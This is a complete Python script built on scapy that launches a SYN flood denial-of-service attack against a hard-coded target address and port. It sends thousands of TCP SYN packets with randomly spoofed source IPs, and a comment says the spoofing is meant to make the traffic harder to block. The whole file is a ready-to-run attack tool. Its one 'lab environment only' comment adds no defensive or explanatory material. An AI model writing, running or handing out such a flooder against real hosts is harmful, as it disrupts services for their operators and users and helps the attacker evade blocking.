from scapy.all import *
import random
import time

# Target IP and port
target_ip = "10.0.0.139"  # Replace with your target IP (lab environment only!)
target_port = 80  # Replace with the target port

# Source IPs (spoofed to be harder to block)
def generate_random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

# SYN flood function
def syn_flood(target_ip, target_port, count=1000, delay=0.001):
    print(f"Starting SYN flood attack on {target_ip}:{target_port}...")
    for i in range(count):
        # Craft a SYN packet with a random source IP
        src_ip = generate_random_ip()
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        
        # Send the packet
        send(packet, verbose=False)
        
        # Print progress
        if i % 100 == 0:
            print(f"Sent {i + 1} packets...")
        
        # Delay between packets (optional, can be removed for faster sending)
        if delay > 0:
            time.sleep(delay)
    
    print("Attack finished.")

if __name__ == "__main__":
    # Run the SYN flood attack
    syn_flood(target_ip, target_port, count=10000, delay=0.001)